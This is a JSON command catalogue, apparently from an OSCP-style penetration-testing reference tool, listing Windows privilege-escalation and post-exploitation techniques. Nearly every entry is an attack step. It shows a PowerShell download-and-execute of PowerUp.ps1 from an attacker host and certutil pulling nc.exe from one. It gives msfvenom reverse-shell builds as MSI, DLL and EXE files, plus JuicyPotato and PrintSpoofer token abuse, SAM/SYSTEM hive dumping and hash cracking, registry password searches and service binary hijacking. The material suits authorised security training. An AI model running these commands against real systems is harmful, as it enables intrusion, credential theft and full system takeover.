{
  "category": "post-exploit",
  "subcategory": "windows",
  "description": "Windows privilege escalation commands and techniques",
  "commands": [
    {
      "id": "win-privesc-winpeas",
      "name": "WinPEAS - Automated Enumeration",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "winPEASany.exe",
      "description": "Comprehensive automated privilege escalation enumeration for Windows",
      "variables": [],
      "flag_explanations": {
        "quiet": "Reduce output verbosity",
        "cmd": "Execute specific checks only",
        "notcolor": "Disable colored output"
      },
      "tags": [
        "AUTOMATED",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINPEAS"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Red/yellow highlighted vulnerabilities",
        "Unquoted service paths found",
        "AlwaysInstallElevated detected",
        "AutoLogon credentials discovered"
      ],
      "failure_indicators": [
        "Antivirus blocks execution",
        "Insufficient permissions"
      ],
      "next_steps": [
        "Focus on RED findings first",
        "Test unquoted service paths",
        "Check AlwaysInstallElevated if enabled"
      ],
      "alternatives": [
        "PowerUp.ps1 for PowerShell-based enum",
        "Windows-Exploit-Suggester",
        "Manual enumeration commands"
      ],
      "notes": "Transfer via certutil, PowerShell download, or SMB share"
    },
    {
      "id": "win-privesc-powerup",
      "name": "PowerUp - PowerShell Enumeration",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks\"",
      "description": "PowerShell-based privilege escalation scanner",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP hosting PowerUp.ps1",
          "example": "10.10.14.5",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ep bypass": "Bypass execution policy",
        "-c": "Execute command",
        "IEX": "Invoke-Expression (run downloaded script)",
        "Invoke-AllChecks": "Run all PowerUp checks"
      },
      "tags": [
        "AUTOMATED",
        "DEFENSE_EVASION",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "POWERSHELL",
        "PRIVILEGE_ESCALATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Service abuse opportunities found",
        "DLL hijacking paths discovered",
        "Registry autologon credentials"
      ],
      "failure_indicators": [
        "Execution policy blocks script",
        "Cannot download from LHOST",
        "AMSI blocks PowerShell"
      ],
      "next_steps": [
        "Run Invoke-ServiceAbuse if vulnerable service found",
        "Use Write-ServiceBinary for DLL hijacking",
        "Extract credentials from output"
      ],
      "alternatives": [
        "Upload PowerUp.ps1 and import locally",
        "Use individual PowerUp functions",
        "WinPEAS if PowerShell is blocked"
      ],
      "notes": "Part of PowerSploit framework - download from GitHub"
    },
    {
      "id": "win-systeminfo",
      "name": "System Information Gathering",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "systeminfo && hostname && whoami /all",
      "description": "Gather basic system information for privilege escalation planning",
      "variables": [],
      "flag_explanations": {
        "systeminfo": "Display detailed system configuration",
        "hostname": "Display computer name",
        "whoami /all": "Display user, groups, and privileges"
      },
      "tags": [
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "RECONNAISSANCE"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "OS version and patch level shown",
        "User privileges displayed",
        "Group memberships listed"
      ],
      "failure_indicators": [
        "Command not found (unusual)"
      ],
      "next_steps": [
        "Search OS version for kernel exploits",
        "Check for SeImpersonate privilege (potato exploits)",
        "Note missing patches"
      ],
      "alternatives": [
        "wmic os get Caption,CSDVersion,OSArchitecture",
        "Get-ComputerInfo (PowerShell)"
      ],
      "notes": "SeImpersonate/SeAssignPrimaryToken = Potato exploit candidates"
    },
    {
      "id": "win-unquoted-service-paths",
      "name": "Find Unquoted Service Paths",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\"",
      "description": "Find services with unquoted paths containing spaces (exploitable)",
      "variables": [],
      "flag_explanations": {
        "wmic service get": "Query service properties",
        "findstr /i auto": "Filter for auto-start services (case-insensitive)",
        "findstr /i /v": "Exclude lines containing pattern",
        "/v \"\"\"\"": "Exclude properly quoted paths"
      },
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Services with unquoted paths found",
        "Paths contain spaces",
        "Services run as SYSTEM"
      ],
      "failure_indicators": [
        "All services properly quoted",
        "No auto-start services with spaces"
      ],
      "next_steps": [
        "Check write permissions on path directories",
        "Create malicious executable in exploitable path",
        "Restart service to trigger payload"
      ],
      "alternatives": [
        "PowerUp's Get-UnquotedService",
        "Manual check with: sc qc <servicename>"
      ],
      "notes": "Example: C:\\Program Files\\My Service\\service.exe tries C:\\Program.exe first"
    },
    {
      "id": "win-weak-service-perms",
      "name": "Check Service Permissions",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
      "description": "Find services with weak permissions (modifiable by current user)",
      "variables": [],
      "flag_explanations": {
        "-u": "Suppress errors",
        "-w": "Show only objects with write access",
        "-c": "Check services",
        "-q": "Omit banner",
        "-v": "Verbose output"
      },
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Services with SERVICE_ALL_ACCESS found",
        "SERVICE_CHANGE_CONFIG permissions",
        "Writable service binaries"
      ],
      "failure_indicators": [
        "accesschk.exe not found",
        "No weak permissions found"
      ],
      "next_steps": [
        "Modify service binary path with sc config",
        "Replace service executable",
        "Restart service for code execution"
      ],
      "alternatives": [
        "PowerUp's Get-ModifiableServiceFile",
        "icacls to check file permissions",
        "Get-Acl in PowerShell"
      ],
      "notes": "Download accesschk from Sysinternals or use PowerShell alternatives"
    },
    {
      "id": "win-always-install-elevated",
      "name": "Check AlwaysInstallElevated",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      "description": "Check if AlwaysInstallElevated is enabled (allows MSI as SYSTEM)",
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry key",
        "HKCU": "HKEY_CURRENT_USER registry hive",
        "HKLM": "HKEY_LOCAL_MACHINE registry hive",
        "/v": "Query specific value"
      },
      "tags": [
        "DATABASE",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "Both keys set to 0x1",
        "AlwaysInstallElevated = 1 in both hives"
      ],
      "failure_indicators": [
        "Keys not found",
        "Value set to 0"
      ],
      "next_steps": [
        "Generate malicious MSI with msfvenom",
        "Execute: msiexec /quiet /qn /i payload.msi",
        "Payload runs as SYSTEM"
      ],
      "alternatives": [
        "PowerUp's Get-RegistryAlwaysInstallElevated",
        "Manual MSI creation with WiX Toolset"
      ],
      "notes": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > payload.msi"
    },
    {
      "id": "win-registry-autologon",
      "name": "Search Registry for Passwords",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s",
      "description": "Search registry for stored passwords (autologon, VNC, etc.)",
      "variables": [],
      "flag_explanations": {
        "/f password": "Search for 'password' string",
        "/t REG_SZ": "Search in string values only",
        "/s": "Search recursively"
      },
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "DISCOVERY",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "VNC"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "AutoAdminLogon passwords found",
        "VNC passwords discovered",
        "Putty session credentials"
      ],
      "failure_indicators": [
        "No passwords in registry",
        "Access denied on sensitive keys"
      ],
      "next_steps": [
        "Decode VNC passwords if found",
        "Try credentials with runas",
        "Use for lateral movement"
      ],
      "alternatives": [
        "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"",
        "Get-ItemProperty for PowerShell"
      ],
      "notes": "Check specifically: Winlogon, VNC, Putty, SNMP keys"
    },
    {
      "id": "win-scheduled-tasks",
      "name": "Enumerate Scheduled Tasks",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "schtasks /query /fo LIST /v && dir C:\\windows\\system32\\tasks",
      "description": "List scheduled tasks that may be exploitable",
      "variables": [],
      "flag_explanations": {
        "/query": "Display scheduled tasks",
        "/fo LIST": "Format as list",
        "/v": "Verbose output",
        "dir tasks": "List task files directly"
      },
      "tags": [
        "DATABASE",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Tasks running as SYSTEM found",
        "Writable task files",
        "Tasks with modifiable binaries"
      ],
      "failure_indicators": [
        "Access denied",
        "No exploitable tasks"
      ],
      "next_steps": [
        "Check if task binary is writable",
        "Look for missing binaries in task",
        "Create malicious binary in task path"
      ],
      "alternatives": [
        "Get-ScheduledTask in PowerShell",
        "accesschk on task binaries"
      ],
      "notes": "Pay attention to tasks with SYSTEM privileges and writable paths"
    },
    {
      "id": "win-dll-hijacking",
      "name": "DLL Hijacking Opportunities",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\*.dll 2>nul | findstr /v \"C:\\Windows\" && echo Check PATH directories",
      "description": "Find potential DLL hijacking opportunities",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search subdirectories, bare format",
        "C:\\*.dll": "Find all DLL files",
        "findstr /v": "Exclude Windows directory"
      },
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Applications loading DLLs from writable paths",
        "Missing DLLs in application directory",
        "Writable directories in PATH"
      ],
      "failure_indicators": [
        "All DLLs in protected locations",
        "No write access to DLL paths"
      ],
      "next_steps": [
        "Use Process Monitor to find missing DLLs",
        "Create malicious DLL with msfvenom",
        "Place DLL in application directory"
      ],
      "alternatives": [
        "PowerUp's Find-ProcessDLLHijack",
        "Process Monitor (procmon) from Sysinternals"
      ],
      "notes": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > evil.dll"
    },
    {
      "id": "win-potato-exploits",
      "name": "Check for Potato Exploit Eligibility",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"",
      "description": "Check for privileges needed for Potato-family exploits",
      "variables": [],
      "flag_explanations": {
        "whoami /priv": "List user privileges",
        "findstr /i": "Case-insensitive search",
        "SeImpersonate": "Impersonate a client after authentication",
        "SeAssignPrimaryToken": "Replace process-level token"
      },
      "tags": [
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "SeImpersonate privilege enabled",
        "SeAssignPrimaryToken privilege enabled",
        "Running as service account"
      ],
      "failure_indicators": [
        "Privileges not present",
        "Running as regular user"
      ],
      "next_steps": [
        "Use JuicyPotato for Windows < 2019",
        "Use PrintSpoofer for Windows 10/2019+",
        "Use RoguePotato as alternative"
      ],
      "alternatives": [
        "JuicyPotato.exe -l 1337 -p cmd.exe -t *",
        "PrintSpoofer.exe -i -c cmd",
        "GodPotato, SweetPotato variants"
      ],
      "notes": "IIS, SQL Server service accounts commonly have these privileges"
    },
    {
      "id": "win-kernel-exploits",
      "name": "Check for Kernel Exploits",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database <DATE>-mssb.xls --systeminfo systeminfo.txt",
      "description": "Identify missing patches and applicable kernel exploits",
      "variables": [
        {
          "name": "<DATE>",
          "description": "Date of exploit database",
          "example": "2024-01-15",
          "required": true
        }
      ],
      "flag_explanations": {
        "--database": "Microsoft security bulletin database",
        "--systeminfo": "Path to systeminfo output"
      },
      "tags": [
        "AUTOMATED",
        "DATABASE",
        "EXPLOITATION",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "PYTHON"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Missing patches identified",
        "Applicable exploits listed",
        "High-priority vulnerabilities found"
      ],
      "failure_indicators": [
        "System fully patched",
        "No public exploits available"
      ],
      "next_steps": [
        "Download suggested exploit",
        "Compile if necessary",
        "Test exploit carefully"
      ],
      "alternatives": [
        "Watson (PowerShell-based)",
        "Sherlock.ps1 for older Windows",
        "Manual searchsploit of OS version"
      ],
      "notes": "Update database: python windows-exploit-suggester.py --update"
    },
    {
      "id": "win-saved-credentials",
      "name": "Check Saved Credentials",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "cmdkey /list && dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* && dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
      "description": "Find saved Windows credentials that can be reused",
      "variables": [],
      "flag_explanations": {
        "cmdkey /list": "List saved credentials",
        "AppData\\Local\\Credentials": "Local credential storage",
        "AppData\\Roaming\\Credentials": "Roaming credential storage"
      },
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Saved credentials found",
        "Administrator credentials cached",
        "Network share credentials"
      ],
      "failure_indicators": [
        "No saved credentials",
        "Credentials encrypted"
      ],
      "next_steps": [
        "Use runas /savecred with found credentials",
        "Extract credentials with mimikatz",
        "Use for lateral movement"
      ],
      "alternatives": [
        "mimikatz: vault::list",
        "rundll32 keymgr.dll,KRShowKeyMgr"
      ],
      "notes": "runas /savecred /user:DOMAIN\\Admin \"cmd.exe\" if admin creds cached"
    },
    {
      "id": "win-password-files",
      "name": "Search for Password Files",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\*password* C:\\*cred* C:\\*vnc* C:\\*.config 2>nul | findstr /v \"[System32 SysWOW64]\"",
      "description": "Search filesystem for files potentially containing passwords",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search subdirectories, bare format",
        "C:\\*password*": "Files with 'password' in name",
        "findstr /v": "Exclude system directories"
      },
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "VNC"
      ],
      "oscp_relevance": "medium",
      "success_indicators": [
        "Password files found in user directories",
        "Configuration files with credentials",
        "VNC password files"
      ],
      "failure_indicators": [
        "No interesting files found",
        "Files encrypted or protected"
      ],
      "next_steps": [
        "Read files for cleartext passwords",
        "Decode VNC passwords",
        "Check .config files for connection strings"
      ],
      "alternatives": [
        "findstr /si password *.txt *.xml *.ini",
        "PowerShell: Get-ChildItem -Recurse | Select-String -Pattern 'password'"
      ],
      "notes": "Also check: unattend.xml, sysprep.inf, web.config"
    },
    {
      "id": "win-sam-system-backup",
      "name": "Check for SAM/SYSTEM Backups",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "dir /s /b C:\\SAM C:\\SYSTEM 2>nul && reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM system.hiv",
      "description": "Find or create SAM/SYSTEM backups for offline password cracking",
      "variables": [],
      "flag_explanations": {
        "dir /s /b": "Search for existing backups",
        "reg save": "Create registry hive backup",
        "HKLM\\SAM": "Security Accounts Manager hive",
        "HKLM\\SYSTEM": "System hive (contains boot key)"
      },
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "POST_EXPLOITATION"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "SAM/SYSTEM files found or created",
        "Files successfully saved",
        "Read permissions on files"
      ],
      "failure_indicators": [
        "Access denied on reg save",
        "Files locked by system"
      ],
      "next_steps": [
        "Transfer files to attacker machine",
        "Extract hashes with secretsdump.py",
        "Crack with hashcat or john"
      ],
      "alternatives": [
        "Copy from C:\\Windows\\Repair\\",
        "Copy from Volume Shadow Copies",
        "Use mimikatz lsadump::sam"
      ],
      "notes": "secretsdump.py -sam sam.hiv -system system.hiv LOCAL"
    },
    {
      "id": "win-group-membership",
      "name": "Check Privileged Group Membership",
      "category": "post-exploit",
      "subcategory": "windows",
      "command": "net user <USERNAME> && net localgroup administrators && whoami /groups",
      "description": "Check user's group memberships for privilege escalation opportunities",
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Username to check",
          "example": "currentuser",
          "required": false
        }
      ],
      "flag_explanations": {
        "net user": "Display user account information",
        "net localgroup": "Display members of local group",
        "whoami /groups": "Display current user's groups"
      },
      "tags": [
        "EXPLOITATION",
        "MANUAL",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN"
      ],
      "oscp_relevance": "high",
      "success_indicators": [
        "User in Administrators group",
        "Backup Operators membership",
        "Server Operators membership"
      ],
      "failure_indicators": [
        "Only standard user groups",
        "No privileged memberships"
      ],
      "next_steps": [
        "If Backup Operators: use backup privileges",
        "If Server Operators: modify services",
        "If Admin with UAC: bypass UAC"
      ],
      "alternatives": [
        "Get-LocalGroupMember in PowerShell",
        "Check domain groups: net user /domain"
      ],
      "notes": "Backup Operators can read any file, Server Operators can modify services"
    },
    {
      "id": "windows-whoami-privs",
      "name": "Check Current Privileges",
      "category": "post-exploit",
      "command": "whoami /priv",
      "description": "List current user privileges on Windows",
      "tags": [
        "DISCOVERY",
        "ENUM",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "/priv": "Display privileges of current user",
        "/groups": "Display group membership (alternative)",
        "/all": "Display all information"
      },
      "success_indicators": [
        "SeImpersonatePrivilege",
        "SeDebugPrivilege",
        "SeBackupPrivilege",
        "SeTakeOwnershipPrivilege"
      ],
      "failure_indicators": [
        "All privileges disabled",
        "Access denied",
        "Command not recognized"
      ],
      "next_steps": [
        "SeImpersonatePrivilege: Use JuicyPotato/PrintSpoofer",
        "SeDebugPrivilege: Migrate to SYSTEM process",
        "SeBackupPrivilege: Read SAM/SYSTEM hives",
        "Check groups: whoami /groups"
      ],
      "alternatives": [
        "whoami /all",
        "net user %username%",
        "Get-ADUser $env:USERNAME"
      ],
      "notes": "SeImpersonatePrivilege = instant win on older Windows",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-systeminfo",
      "name": "System Information Gathering",
      "category": "post-exploit",
      "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
      "description": "Get Windows version for exploit research",
      "tags": [
        "ENUM",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "RECONNAISSANCE",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "systeminfo": "Display detailed system configuration",
        "findstr": "Filter output for specific lines",
        "/B": "Match beginning of line",
        "/C:": "Literal search string"
      },
      "success_indicators": [
        "Windows 7",
        "Windows Server 2008",
        "Windows Server 2012",
        "x64-based PC"
      ],
      "failure_indicators": [
        "Access denied",
        "Command not found",
        "RPC server unavailable"
      ],
      "next_steps": [
        "Search exploits: searchsploit windows <version>",
        "Check hotfixes: wmic qfe list",
        "Windows Exploit Suggester: python windows-exploit-suggester.py --database db.xlsx --systeminfo sysinfo.txt",
        "Check architecture for payload: x64 vs x86"
      ],
      "alternatives": [
        "ver",
        "wmic os get Caption,Version,BuildNumber",
        "Get-ComputerInfo"
      ],
      "notes": "Save full output for Windows Exploit Suggester",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-unquoted-service",
      "name": "Find Unquoted Service Paths",
      "category": "post-exploit",
      "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
      "description": "Find services with unquoted paths for privilege escalation",
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "wmic": "Windows Management Instrumentation Command",
        "findstr /i": "Case insensitive search",
        "/v": "Inverse match (exclude)",
        "\\\"\"": "Find paths without quotes"
      },
      "success_indicators": [
        "C:\\Program Files\\Service Name\\",
        "Spaces in path without quotes",
        "Auto start services"
      ],
      "failure_indicators": [
        "No unquoted paths",
        "All paths quoted",
        "Access denied"
      ],
      "next_steps": [
        "Check permissions: icacls \"C:\\Program Files\\Service Name\"",
        "Create malicious exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Service.exe",
        "Place exe in path: copy Service.exe \"C:\\Program Files\\Service.exe\"",
        "Restart service: sc stop <service> && sc start <service>"
      ],
      "alternatives": [
        "Get-WmiObject win32_service | Select Name, PathName",
        "sc qc <service>"
      ],
      "notes": "Requires write access to parent directory",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-alwaysinstallelevated",
      "name": "Check AlwaysInstallElevated",
      "category": "post-exploit",
      "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      "description": "Check if MSI files install with SYSTEM privileges",
      "tags": [
        "DATABASE",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry values",
        "HKLM": "HKEY_LOCAL_MACHINE hive",
        "HKCU": "HKEY_CURRENT_USER hive",
        "/v": "Query specific value name"
      },
      "success_indicators": [
        "AlwaysInstallElevated    REG_DWORD    0x1",
        "Both HKLM and HKCU set to 0x1"
      ],
      "failure_indicators": [
        "ERROR: The system was unable to find",
        "0x0 value",
        "Only one location set"
      ],
      "next_steps": [
        "Create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi",
        "Install MSI: msiexec /quiet /qn /i shell.msi",
        "Alternative: use Metasploit always_install_elevated module",
        "Clean up: del shell.msi"
      ],
      "alternatives": [
        "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        "PowerUp.ps1 Invoke-AllChecks"
      ],
      "notes": "Both keys must be set for exploitation",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-scheduled-tasks",
      "name": "Enumerate Scheduled Tasks",
      "category": "post-exploit",
      "command": "schtasks /query /fo LIST /v | findstr /C:\"Task To Run\" /C:\"Run As User\"",
      "description": "Find scheduled tasks running as SYSTEM",
      "tags": [
        "DATABASE",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "/query": "Display scheduled tasks",
        "/fo LIST": "Format output as list",
        "/v": "Verbose output with all properties"
      },
      "success_indicators": [
        "Run As User: SYSTEM",
        "Run As User: Administrator",
        "Writable script paths",
        "Missing script files"
      ],
      "failure_indicators": [
        "Access denied",
        "No tasks found",
        "All run as current user"
      ],
      "next_steps": [
        "Check script permissions: icacls <script_path>",
        "Replace script content if writable",
        "Check next run time in task details",
        "Force run: schtasks /run /tn <task_name>"
      ],
      "alternatives": [
        "Get-ScheduledTask | Select TaskName,Principal",
        "dir C:\\Windows\\System32\\Tasks"
      ],
      "notes": "Focus on tasks with writable binaries/scripts",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-service-permissions",
      "name": "Check Service Permissions",
      "category": "post-exploit",
      "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
      "description": "Find services with weak permissions",
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "-u": "Suppress errors",
        "-w": "Show only writable objects",
        "-c": "Service objects",
        "-q": "Quiet/minimal output",
        "-v": "Verbose",
        "/accepteula": "Auto accept EULA"
      },
      "success_indicators": [
        "SERVICE_CHANGE_CONFIG",
        "SERVICE_ALL_ACCESS",
        "SERVICE_START",
        "SERVICE_STOP"
      ],
      "failure_indicators": [
        "No matching objects",
        "Access denied",
        "accesschk.exe not found"
      ],
      "next_steps": [
        "Query service: sc qc <service>",
        "Change binary path: sc config <service> binPath= \"C:\\temp\\shell.exe\"",
        "Restart service: sc stop <service> && sc start <service>",
        "Restore original: sc config <service> binPath= \"<original_path>\""
      ],
      "alternatives": [
        "sc sdshow <service>",
        "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>"
      ],
      "notes": "Download accesschk from Sysinternals",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-potato-attacks",
      "name": "Potato Attacks (JuicyPotato)",
      "category": "post-exploit",
      "command": "JuicyPotato.exe -l 1337 -p C:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
      "description": "Exploit SeImpersonatePrivilege for SYSTEM shell",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "-l": "Local COM server listen port",
        "-p": "Program to launch",
        "-t": "CreateProcess call type (*=try both)",
        "-c": "CLSID to abuse"
      },
      "success_indicators": [
        "CreateProcessWithTokenW OK",
        "Process created",
        "SYSTEM shell obtained"
      ],
      "failure_indicators": [
        "Operation failed",
        "Cannot bind to port",
        "No valid CLSID"
      ],
      "next_steps": [
        "Test CLSIDs: JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
        "CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID",
        "Alternative: PrintSpoofer.exe -i -c cmd",
        "RoguePotato for newer Windows"
      ],
      "alternatives": [
        "PrintSpoofer.exe -i -c cmd",
        "SweetPotato.exe -p cmd"
      ],
      "notes": "Works up to Windows Server 2016/Windows 10 1809",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-sam-system-backup",
      "name": "SAM/SYSTEM Backup Files",
      "category": "post-exploit",
      "command": "dir /s /b C:\\Windows\\repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM",
      "description": "Find backup SAM/SYSTEM files for hash extraction",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "/s": "Search subdirectories",
        "/b": "Bare format (paths only)",
        "SAM": "Security Account Manager database",
        "SYSTEM": "System registry hive"
      },
      "success_indicators": [
        "SAM file found",
        "SYSTEM file found",
        "Readable backup files"
      ],
      "failure_indicators": [
        "File not found",
        "Access denied",
        "Empty RegBack folder"
      ],
      "next_steps": [
        "Copy files: copy C:\\Windows\\repair\\SAM C:\\temp\\",
        "Transfer to attacker: certutil -urlcache -f http://<IP>/nc.exe nc.exe",
        "Extract hashes: impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
        "Crack or PTH: hashcat -m 1000 hashes.txt wordlist.txt"
      ],
      "alternatives": [
        "reg save HKLM\\SAM sam.save",
        "reg save HKLM\\SYSTEM system.save"
      ],
      "notes": "Requires backup files or SeBackupPrivilege",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-stored-credentials",
      "name": "Search for Stored Credentials",
      "category": "post-exploit",
      "command": "cmdkey /list",
      "description": "List stored credentials in Windows Credential Manager",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
